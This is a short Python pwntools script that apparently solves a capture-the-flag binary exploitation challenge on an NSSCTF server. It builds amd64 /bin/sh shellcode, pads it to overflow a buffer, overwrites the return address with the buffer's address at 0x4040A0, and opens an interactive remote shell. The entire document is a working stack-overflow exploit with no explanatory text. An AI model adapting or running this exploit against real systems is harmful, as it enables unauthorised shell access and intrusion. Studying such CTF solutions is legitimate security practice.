from pwn import *

context(arch="amd64", os="linux", log_level="info")

io = remote("node5.anna.nssctf.cn", 21101)

buff_addr = 0x4040A0

shellcode = asm(shellcraft.amd64.sh())  # pyright: ignore[reportAttributeAccessIssue]

payload = shellcode.ljust(0x100, b'\x00')
payload += p64(0) + p64(buff_addr)
io.send(payload)
io.interactive()
